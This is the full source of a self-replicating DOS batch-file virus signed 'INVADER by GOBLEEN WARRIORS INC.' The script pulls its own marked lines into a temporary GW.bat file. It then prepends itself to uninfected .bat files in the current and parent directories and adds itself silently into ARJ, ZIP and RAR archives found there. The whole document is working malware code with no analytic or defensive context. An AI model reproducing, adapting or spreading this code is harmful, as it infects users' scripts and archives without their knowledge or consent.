@echo off %GW%
break off %GW%
if _%1==__ goto GWa
find "GW"<%0>>GW.bat
for %%a in (*.bat ..\*.bat ..\..\*.bat) do call GW.bat _ %%a
for %%a in (*.arj ..\*.arj ..\..\*.arj) do arj a %%a %0>nul %GW%
for %%a in (*.zip ..\*.zip ..\..\*.zip) do pkzip %%a %0>nul %GW%
for %%a in (*.rar ..\*.rar ..\..\*.rar) do rar a -tk -y -c- -o+ %%a %0>nul %GW%
del GW.bat
goto GWe
:GWa
find "GW"<%2>nul
if not errorlevel 1 goto GWe
copy /b %2 GW>nul
copy /b GW.bat+GW %2>nul
del GW
:GWe
break on %GW%
:[INVADER] by GOBLEEN WARRIORS INC.(GWI)
